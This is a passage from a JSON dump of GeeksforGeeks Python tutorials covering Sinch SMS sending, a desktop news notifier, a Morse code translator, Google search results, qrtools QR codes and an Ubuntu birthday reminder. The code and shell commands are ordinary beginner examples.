'your_app_secret'\u00a0\u00a0\u00a0\u00a0\u00a0# enter the message to be sent\u00a0\u00a0\u00a0\u00a0message = 'Hello Message!!!'\u00a0\u00a0\u00a0\u00a0\u00a0client = SinchSMS(app_key, app_secret)\u00a0\u00a0\u00a0\u00a0print(\"Sending '%s' to %s\" % (message, number))\u00a0\u00a0\u00a0\u00a0\u00a0response = client.send_message(number, message)\u00a0\u00a0\u00a0\u00a0message_id = response['messageId']\u00a0\u00a0\u00a0\u00a0response = client.check_status(message_id)\u00a0\u00a0\u00a0\u00a0\u00a0# keep trying unless the status returned is Successful\u00a0\u00a0\u00a0\u00a0while response['status'] != 'Successful':\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(response['status'])\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0time.sleep(1)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0response = client.check_status(message_id)\u00a0\u00a0\u00a0\u00a0\u00a0print(response['status'])\u00a0if __name__ == \"__main__\":\u00a0\u00a0\u00a0\u00a0sendSMS()For the execution of the script, edit the number, app_key, and app_secret fields, and then simply run the script.I have written a complete script for sending SMS updates to mobile phones using sinchSMS and way2sms by fetching the latest updates from our placement website(aitplacements.com). GitHub link: stayUpdatedExercise: Create a python script that updates you on your mobile phone if the price of a particular product lowers down to a certain price on amazon.com\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "e3414dd248e2a85dbf785cfc084ed516",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "To get started with the Desktop News Notifier, we require two libraries: feedparser and notify2.\u00a0Give following command to to install feedparser:\u00a0sudo pip3 install feedparserFor installing notify2 in your terminal:sudo pip3 install notify2Feedparser will parse the feed that we will get from the URL. We will use notify2 for the desktop notification purpose. Other than these two libraries, we will use OS and time lib. Once you are done with the installation import both libraries in the program. Here, in this example I have parsed the news from the BBC UK, you can use any news feedparser URL. Let\u2019s have a look at the program:\u00a0\u00a0Python# Python program to illustrate# desktop news notifierimport feedparserimport notify2import osimport timedef parseFeed():\u00a0\u00a0\u00a0\u00a0f = feedparser.parse(\"http://feeds.bbci.co.uk/news/rss.xml\")\u00a0\u00a0\u00a0\u00a0ICON_PATH = os.getcwd() + \"/icon.ico\"\u00a0\u00a0\u00a0\u00a0notify2.init('News Notify')\u00a0\u00a0\u00a0\u00a0for newsitem in f['items']:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0n = notify2.Notification(newsitem['title'],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0newsitem['summary'],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0icon=ICON_PATH\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0)\u00a0\u00a0\u00a0\u00a0n.set_urgency(notify2.URGENCY_NORMAL)\u00a0\u00a0\u00a0\u00a0n.show()\u00a0\u00a0\u00a0\u00a0n.set_timeout(15000)\u00a0\u00a0\u00a0\u00a0time.sleep(1200)\u00a0\u00a0\u00a0\u00a0\u00a0if __name__ == '__main__':\u00a0\u00a0\u00a0\u00a0parseFeed()Screenshot of the news notification popupStep by step Explanation of Code:\u00a0f = feedparser.parse(\"http://feeds.bbci.co.uk/news/rss.xml\")Here feedparser will parse the news data from the feed URL. The parsed data will be in the form of dictionary.\u00a0ICON_PATH = os.getcwd() + \"/icon.ico\"If you want to set any icon in the notification then here we are setting the Icon path. This is optional.notify2.init('News Notify')Here we are initializing the notify2 using the init method of notify2. Initialize the D-Bus connection. Must be called before you send any notifications, or retrieve server info or capabilities. for newsitem in f['items']: \n        n = notify2.Notification(newsitem['title'], \n                                 newsitem['summary'], \n                                 icon=ICON_PATH \n                                 )Looping from the parsed data to get the relevant information like news title, short summary and setting the notification icon using the Notification method of the notify2 lib.n.set_urgency(notify2.URGENCY_NORMAL)Set the urgency level to one of URGENCY_LOW, URGENCY_NORMAL or URGENCY_CRITICALn.show()This method will show the notification on the Desktopn.set_timeout(15000)Setting the time to keep the notification on the desktop (in milliseconds). I have set here as 15 seconds.\u00a0time.sleep(1200)This will usually display the news notification every 20 mins. You can set the time as per your requirement. You can find the full source code that is hosted on GitHubThis article is contributed by Srce Cde. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "63466c6c599b40111d6954202d10077d",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Morse code is a method of transmitting text information as a series of on-off tones, lights, or clicks that can be directly understood by a skilled listener or observer without special equipment. It is named for Samuel F. B. Morse, an inventor of the telegraph.AlgorithmThe algorithm is very simple. Every character in the English language is substituted by a series of \u2018dots\u2019 and \u2018dashes\u2019 or sometimes just singular \u2018dot\u2019 or \u2018dash\u2019 and vice versa.\u00a0Please refer to this Wikipedia image for details.Encryption\u00a0In the case of encryption, we extract each character (if not space) from a word one at a time and match it with its corresponding morse code stored in whichever data structure we have chosen(if you are coding in python, dictionaries can turn out to be very useful in this case)Store the morse code in a variable that will contain our encoded string and then we add a space to our string that will contain the result.While encoding in morse code we need to add 1 space between every character and 2 consecutive spaces between every word.If the character is a space then add another space to the variable containing the result. We repeat this process till we traverse the whole stringDecryptionIn the case of decryption, we start by adding a space at the end of the string to be decoded (this will be explained later).Now we keep extracting characters from the string till we are not getting any space.As soon as we get a space we look up the corresponding English language character to the extracted sequence of characters (or our morse code) and add it to a variable that will store the result.Remember keeping track of the space is the most important part of this decryption process. As soon as we get 2 consecutive spaces we will add another space to our variable containing the decoded string.The last space at the end of the string will help us identify the last sequence of morse code characters (since space acts as a check for extracting characters and start decoding them).Implementation:Python provides a data structure called a dictionary which stores information in the form of key-value pairs which is very convenient for implementing a cipher such as a morse code. We can save the morse code chart in a dictionary where (key-value pairs) => (English Characters-Morse Code). The plaintext (English characters) takes the place of keys and the ciphertext (Morse code) forms the values of the corresponding keys. The values of keys can be accessed from the dictionary in the same way we access the values of an array through their index and vice versa.\u00a0Python3# Python program to implement Morse Code Translator\u00a0'''VARIABLE KEY'cipher' -> 'stores the morse translated form of the english string''decipher' -> 'stores the english translated form of the morse string''citext' -> 'stores morse code of a single character''i' -> 'keeps count of the spaces between morse characters''message' -> 'stores the string to be encoded or decoded''''\u00a0# Dictionary representing the morse code chartMORSE_CODE_DICT = { 'A':'.-', 'B':'-...',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'C':'-.-.', 'D':'-..', 'E':'.',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'F':'..-.', 'G':'--.', 'H':'....',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'I':'..', 'J':'.---', 'K':'-.-',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'L':'.-..', 'M':'--', 'N':'-.',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'O':'---', 'P':'.--.', 'Q':'--.-',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'R':'.-.', 'S':'...', 'T':'-',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'U':'..-', 'V':'...-', 'W':'.--',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'X':'-..-', 'Y':'-.--', 'Z':'--..',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'1':'.----', '2':'..---', '3':'...--',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'4':'....-', '5':'.....', '6':'-....',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'7':'--...', '8':'---..', '9':'----.',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'0':'-----', ', ':'--..--', '.':'.-.-.-',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'?':'..--..', '/':'-..-.', '-':'-....-',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'(':'-.--.', ')':'-.--.-'}\u00a0# Function to encrypt the string# according to the morse code chartdef encrypt(message):\u00a0\u00a0\u00a0\u00a0cipher = ''\u00a0\u00a0\u00a0\u00a0for letter in message:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if letter != ' ':\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Looks up the dictionary and adds the\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# correspponding morse code\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# along with a space to separate\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# morse codes for different characters\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0cipher += MORSE_CODE_DICT[letter] + ' '\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# 1 space indicates different characters\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# and 2 indicates different words\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0cipher += ' '\u00a0\u00a0\u00a0\u00a0\u00a0return cipher\u00a0# Function to decrypt the string# from morse to englishdef decrypt(message):\u00a0\u00a0\u00a0\u00a0\u00a0# extra space added at the end to access the\u00a0\u00a0\u00a0\u00a0# last morse code\u00a0\u00a0\u00a0\u00a0message += ' '\u00a0\u00a0\u00a0\u00a0\u00a0decipher = ''\u00a0\u00a0\u00a0\u00a0citext = ''\u00a0\u00a0\u00a0\u00a0for letter in message:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# checks for space\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (letter != ' '):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# counter to keep track of space\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0i = 0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# storing morse code of a single character\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0citext += letter\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# in case of space\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# if i = 1 that indicates a new character\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0i += 1\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# if i = 2 that indicates a new word\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if i == 2 :\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# adding space to separate words\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0decipher += ' '\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# accessing the keys using their values (reverse of encryption)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0decipher += list(MORSE_CODE_DICT.keys())[list(MORSE_CODE_DICT\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0.values()).index(citext)]\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0citext = ''\u00a0\u00a0\u00a0\u00a0\u00a0return decipher\u00a0# Hard-coded driver function to run the programdef main():\u00a0\u00a0\u00a0\u00a0message = \"GEEKS-FOR-GEEKS\"\u00a0\u00a0\u00a0\u00a0result = encrypt(message.upper())\u00a0\u00a0\u00a0\u00a0print (result)\u00a0\u00a0\u00a0\u00a0\u00a0message = \"--. . . -.- ... -....- ..-. --- .-. -....- --. . . -.- ... \"\u00a0\u00a0\u00a0\u00a0result = decrypt(message)\u00a0\u00a0\u00a0\u00a0print (result)\u00a0# Executes the main functionif __name__ == '__main__':\u00a0\u00a0\u00a0\u00a0main()Output:--. . . -.- ... -....- ..-. --- .-. -....- --. . . -.- ... \nGEEKS-FOR-GEEKSThis article is contributed by Palash Nigam . If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "9c62b4ff2ab409b43f10aac86fe77fe2",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Let\u2019s say you are working on a project that needs to do web scraping but you don\u2019t know websites on which scraping is to be performed beforehand instead you are required to perform a google search and then proceed according to google search results to a few websites. In that case, you need google search results for your different queries.One way of achieving this is using request and beautiful soup which has been discussed here in Implementing Web Scraping in Python with BeautifulSoup.Instead of putting so much effort into a trivial task google package has been made. It\u2019s almost a one-liner solution to find links to all the google search results directly.Using python package google we can get results of google search from the python script. We can get links to first n search results.Installation\u00a0google package has one dependency on beautifulsoup which needs to be installed first.\u00a0\u00a0pip install beautifulsoup4Then install the google package\u00a0\u00a0pip install googleRequired Function and its parameters\u00a0query: query string that we want to search for.TLD: TLD stands for the top-level domain which means we want to search our results on google.com or google. in or some other domain.lang: lang stands for language.num: Number of results we want.start: The first result to retrieve.stop: The last result to retrieve. Use None to keep searching forever.pause: Lapse to wait between HTTP requests. Lapse too short may cause Google to block your IP. Keeping significant lapses will make your program slow but it\u2019s a safe and better option.Return: Generator (iterator) that yields found URLs. If the stop parameter is None the iterator will loop forever.Python codes on how to do a google search using python scriptExample1: google_search.py\u00a0\u00a0Pythontry:\u00a0\u00a0\u00a0\u00a0from googlesearch import searchexcept ImportError:\u00a0\u00a0\u00a0\u00a0print(\"No module named 'google' found\")\u00a0# to searchquery = \"Geeksforgeeks\"\u00a0for j in search(query, tld=\"co.in\", num=10, stop=10, pause=2):\u00a0\u00a0\u00a0\u00a0print(j)Output:\u00a0Let\u2019s perform a google search manually and verify our result\u00a0Example 2: google_search.py\u00a0Pythontry:\u00a0\u00a0\u00a0\u00a0from googlesearch import searchexcept ImportError:\u00a0\u00a0\u00a0\u00a0print(\"No module named 'google' found\")\u00a0# to searchquery = \"A computer science portal\"\u00a0for j in search(query, tld=\"co.in\", num=10, stop=10, pause=2):\u00a0\u00a0\u00a0\u00a0print(j)Output:\u00a0\u00a0Let\u2019s perform a google search manually and verify our resultReference: Google python packageThis article is contributed by Pratik Chhajer. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "8b4b1efe40e44f90ef03fcc05750267b",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "This article aims to introduce the use of the python library: qrtools. This library can be used to both read QR codes and generate them.What are QR codes?QR code, or quick response code, is a trademark for a type of 2 dimensional barcode. 2 dimensional barcodes are similar to one dimensional barcodes, but can store more information per unit area.Installation and DependenciesDebian Linux: qrtools can be installed on debian based linux systems with the following commands\r\nsudo apt-get update\r\nsudo apt-get install python-qrtools\r\nThe following dependencies must be installed as well\r\n[sudo] pip install pypng\r\n[sudo] pip install zbar\r\n[sudo] pip install pillow\r\nWindows: qrtools can be installed on windows by downloading the file from here. On downloading and extraction, run the following command from inside the folder\r\npython setup.py install\r\nGenerate a QR Codeqrtools contains a class QR (can be viewed in the source code), for which we must initially create an object. The object takes the following argumentsdatapixel_sizelevelmargin_sizedata_typeTo create a QR code with default settings, we must simply specify the data while creating the object. Note that the data must be a unicode object if non-ASCII objects are going to be used.# Python program to generate QR codefrom qrtoolsimport QR\u00a0\u00a0# creates the QR objectmy_QR = QR(data = u\"Example\")\u00a0\u00a0# encodes to a QR codemy_QR.encode()If the program runs successfully, it returns a value of 0, and the QR code is stored in the tmp folder. To know the exact location, use the following command\r\nprint (my_QR.filename)\r\nSample output\r\n/tmp/qr-1496334996.385343/7489ebbcc2a00056ddaaaac190bce473e5c03696ea1bd8ed83cf59a174283862.png\r\nThis file can now be moved to another folder as per our convenience# Python program to generate QR codefrom qrtools import QR\u00a0\u00a0import osmy_QR = QR(data = u\"Example\")my_QR.encode()\u00a0\u00a0# command to move the QR code to the desktopos.system(\"sudo mv \" + my_QR.filename + \" ~/Desktop\")The pixel value of the QR code may also be changed by specifying the value during the creation of the QR object. The default size tends to be a little small for reading using scanners on smartphones, so a size of around 10 would be ideal for such purposes, for example:\r\nmy_QR = QR(data = u\"example\", pixel_size = 10)\r\nThe below QR code has pixel size = 10, and has been encoded with a URLWe can also add email data, sms data, mms data, bookmarks, etc to the QR code. The following code excerpt is taken from the source code, which specifies the various data types that can be used along with the format of the data that would be required for its usage:# use these for custom data formats eg. url, phone number, VCARD# data should be an unicode object or a list of unicode objectsdata_encode = {\u00a0\u00a0\u00a0\u00a0'text': lambda data: data,\u00a0\u00a0\u00a0\u00a0'url': encode_url,\u00a0\u00a0\u00a0\u00a0'email': lambda data: 'mailto:' + re.compile(\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0r'^mailto:', re.IGNORECASE\u00a0\u00a0\u00a0\u00a0).sub('', data),\u00a0\u00a0\u00a0\u00a0'emailmessage': lambda data: 'MATMSG:TO:' + data[0] + ';SUB:' + data[1] +\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0';BODY:' + data[2] + ';;',\u00a0\u00a0\u00a0\u00a0'telephone': lambda data: 'tel:' + re.compile(\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0r'^tel:', re.IGNORECASE\u00a0\u00a0\u00a0\u00a0).sub('', data),\u00a0\u00a0\u00a0\u00a0'sms': lambda data: 'SMSTO:' + data[0] + ':' + data[1],\u00a0\u00a0\u00a0\u00a0'mms': lambda data: 'MMSTO:' + data[0] + ':' + data[1],\u00a0\u00a0\u00a0\u00a0'geo': lambda data: 'geo:' + data[0] + ', ' + data[1],\u00a0\u00a0\u00a0\u00a0'bookmark': lambda data: \"MEBKM:TITLE:\" + data[0] + \";URL:\" +\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0data[1] + \";;\",\u00a0\u00a0\u00a0\u00a0# phonebook or meCard should be a list of tuples like this:\u00a0\u00a0\u00a0\u00a0# [('N', 'Name'), ('TEL', '231698890'), ...]\u00a0\u00a0\u00a0\u00a0'phonebook': lambda data: \"MECARD:\" + \";\".join([\":\".join(i)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0for i in data]) + \";\"}From the above code, we observe the various data types that can be assigned and used while creating QR codes. For example, to use a bookmark as data we must provide data as a list, consisting of a title and the url. To accomplish this, we must do the following# Python program to generate QR codefrom qrtools import QR\u00a0\u00a0# creates the QR objectmy_QR = QR(data = [u\"geeksforgeeks\", u\"https://www.geeksforgeeks.org/\"],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0data_type = 'bookmark')\u00a0\u00a0# encodes to a QR codemy_QR.encode()Read a QR codeScanning and reading a QR code is relatively simple. While creating the QR object, we must simply specify the path to the QR code as an argument. Suppose we are trying to decode the QR code created at the beginning of the article.# Python program to Scan and Read a QR codefrom qrtools import QRmy_QR = QR(filename = \"home/user/Desktop/qr.png\")\u00a0\u00a0# decodes the QR code and returns True if successfulmy_QR.decode()\u00a0\u00a0# prints the dataprint (my_QR.data)Output :\r\nExample\r\nWe may also print the values of the other parameters passed while creating the QR object to generate the QR code, for example, using the same QR code generated at the beginning of the article, additionally adding these print statements would give the following additional output\r\nprint (my_QR.data_type)\r\nprint (my_QR.pixel_size)\r\nprint (my_QR.margin_size)\r\nOutput:\r\ntext\r\n3\r\n4\r\nThis article is contributed by Deepak Srivatsav. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "1c6c40e805a962981feee47a832c4789",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "This app helps in reminding birthdays and notifying your friend\u2019s birthdays. This app uses Python and Ubuntu notifications to notify users on every startup of the system.# Python program For# Birthday Reminder Application\u00a0\u00a0# time module is must as reminder\u00a0# is set with the help of datesimport time\u00a0\u00a0# os module is used to notify user\u00a0# using default \"Ubuntu\" notification barimport os\u00a0\u00a0# Birthday file is the one in which the actual birthdays# and dates are present. This file can be\u00a0# manually edited or can be automated.\u00a0# For simplicity, we will edit it manually.# Birthdays should be written in this file in# the format: \"MonthDay Name Surname\" (Without Quotes)\u00a0\u00a0birthdayFile = '/path/to/birthday/file'\u00a0\u00a0def checkTodaysBirthdays():\u00a0\u00a0\u00a0\u00a0fileName = open(birthdayFile, 'r')\u00a0\u00a0\u00a0\u00a0today = time.strftime('%m%d')\u00a0\u00a0\u00a0\u00a0flag = 0\u00a0\u00a0\u00a0\u00a0for line in fileName:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if today in line:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0line = line.split(' ')\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0flag =1\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# line[1] contains Name and line[2] contains Surname\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0os.system('notify-send \"Birthdays Today: ' + line[1]\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0+ ' ' + line[2] + '\"')\u00a0\u00a0\u00a0\u00a0if flag == 0:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0os.system('notify-send \"No Birthdays Today!\"')\u00a0\u00a0if __name__ == '__main__':\u00a0\u00a0\u00a0\u00a0checkTodaysBirthdays()Adding the script to StartupAfter writing the above code now it is the time to add this Python script to startup. This can be done in Ubuntu as follows:Firstly, we have to create an executable file for our reminder.py scriptThis can be done by typing the following command in the terminalsudo chmod +x reminder.py, where reminder.py is our script file name Now we have to transfer this file to the path where Linux searches for its default files:Type this command in terminal: sudo cp /path/to/our/reminder.py /usr/bin. This will add our executable script to /usr/bin.In global search, search for Startup ApplicationsClick on Add and Give a desired Name for your processType in the command. For example, our file name is reminder.py then type reminder.py in the command field and Select AddNOTE: The script runs automatically(once added to startup) everytime you start your system. Also, If you have more than two birthdays on the same day, both the birthdays will be notified in the notification.How the birthday file should look likeOutput after running the scriptThis article is contributed by Omkar Pathak. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
